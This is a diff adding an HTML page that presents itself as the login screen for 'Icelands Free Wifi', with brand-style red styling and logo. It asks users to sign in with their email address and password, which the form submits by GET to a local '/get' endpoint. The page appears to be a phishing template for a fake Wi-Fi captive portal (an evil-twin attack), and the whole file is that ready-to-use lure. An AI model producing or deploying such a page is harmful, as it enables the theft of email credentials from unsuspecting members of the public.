@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.form-container {
+  background: #fff;
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #ccc; 
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #D32131;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #000000;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo">
+    <svg xmlns="http://www.w3.org/2000/svg" width="500" height="300" viewBox="-8.36508 -3.115625 72.49736 18.69375"><path d="M30.7548 2.5944c-1.5459 0-2.9164.364-3.645.6265.0294.102.3215 1.56.3648 1.735.9039-.3207 2.099-.5387 2.8868-.5387 1.2676 0 1.82.3637 1.82 1.2672v.3647c-3.9783 0-5.6395 1.4133-5.6395 3.2357 0 2.026 1.852 3.1775 4.489 3.1775 1.7199 0 3.2361-.2914 3.8627-.4812V5.8015c0-2.172-1.3713-3.2071-4.1388-3.2071m1.4266 8.0024c-.261.0579-.6992.0875-.9313.0875-.919 0-1.8948-.3793-1.8948-1.4288 0-1.0491.9038-1.5448 2.8261-1.5303zM9.2357 2.5944c-2.8269 0-4.9548 2.1283-4.9548 5.16 0 2.8131 1.953 4.7079 4.8828 4.7079.7585 0 1.779-.2187 2.3177-.4375l-.4226-1.632c-.5101.1747-1.0791.2477-1.487.2477-1.5737 0-2.5509-1.1518-2.5509-3.0462 0-1.91 1.0936-3.1771 2.668-3.1771.3783 0 .7868.1009 1.107.218l.4672-1.6768c-.5546-.2324-1.341-.364-2.0274-.364M53.0413.0003v2.7255c-.3062-.0586-.743-.1312-1.3694-.1312-2.3185 0-4.8098 1.5885-4.8098 4.9995 0 3.0463 1.9815 4.8684 5.2899 4.8684 1.3995 0 2.9594-.2191 3.6152-.4089V.0003zm0 10.625c-.2332.044-.5538.0585-.743.0585-1.7056 0-2.6817-1.166-2.6817-3.1626 0-1.5163.641-3.1041 2.5354-3.1041.2628 0 .6988.043.8893.1012zm-35.1287.0587c-2.1424 0-2.8134-.9186-2.9887-1.7777l5.8148-1.2393c-.0138-4.2559-2.5498-5.0722-4.1966-5.0722-2.1428 0-4.4602 1.5596-4.4602 4.9996 0 3.0458 2.0405 4.868 5.4219 4.868 1.021 0 2.1431-.2188 2.7255-.4379l-.3637-1.6316c-.5397.1743-1.312.291-1.953.291m-1.3705-6.267c.8894 0 1.487.6406 1.5893 1.8796l-3.3384.714c-.0286-1.6464.6566-2.5936 1.7491-2.5936m5.7432 7.8559h2.7111V0h-2.711zM0 12.2728h2.711V0H0zm39.5297-7.7395c.393-.0882 1.0054-.1612 1.4866-.1612 1.0061 0 1.6612.2924 1.6612 1.604v6.2968h2.7118V5.83c0-2.2006-1.3416-3.2357-4.3137-3.2357-1.6775 0-3.5867.3355-4.2718.4805v9.198h2.7259z" fill="#d11c2e"/></svg>
+
+
+  </div>
+
+  <div class="form-container">
+
+      <center><h1>Sign into Icelands Free Wifi</h1>
+                    <h2>Use your Email Account to sign in</h2></center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+      
+      <button class="submit-btn" type="submit">Continue</button>
+    
+    </form>
+
+  </div>
+
+</div>
+
+</body>
+</html>
